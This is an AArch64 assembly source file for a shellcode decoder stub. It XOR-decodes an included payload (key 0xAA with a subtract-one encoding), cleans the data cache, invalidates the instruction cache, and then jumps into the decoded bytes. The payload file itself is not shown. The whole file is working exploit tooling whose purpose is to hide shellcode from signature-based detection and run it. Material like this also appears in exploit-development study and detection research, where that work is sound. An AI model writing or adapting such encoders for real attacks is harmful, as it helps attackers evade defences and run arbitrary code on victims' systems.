.global _start
.text

_start:
	adr x1, shellcode	// encoded shellcode
	adr x2, shellcode_end	//
	mov w4, #0xAA		// XOR key

decode:
	ldrb w3, [x1]		// load encoded byte
	add w3, w3, #1		// add 1 byte
	eor w3, w3, w4 		// original byte
	strb w3, [x1]		// store original byte
	add x1, x1, #1		// next byte
	cmp x1, x2
	blo decode 		// loop until end 

	// __clear_cache
	adr     x1, shellcode

data_clean:
	dc cvau, x1          	// data cache clean
	add x1, x1, #1
	cmp x1, x2		// compare previously cached byte with decoded one
	blo data_clean
	dsb ish               	// wait for cleans to complete
	adr x1, shellcode

instr_clean:  
	ic ivau, x1          	// instruction cache invalidation
	add x1, x1, #1
	cmp x1, x2
	blo instr_clean
	dsb ish               	// wait for invalidates
	isb                     // flush the pipeline

	b shellcode 		// run decoded shellcode

.align 2
shellcode:
	.include "shellcode.inc"
shellcode_end:
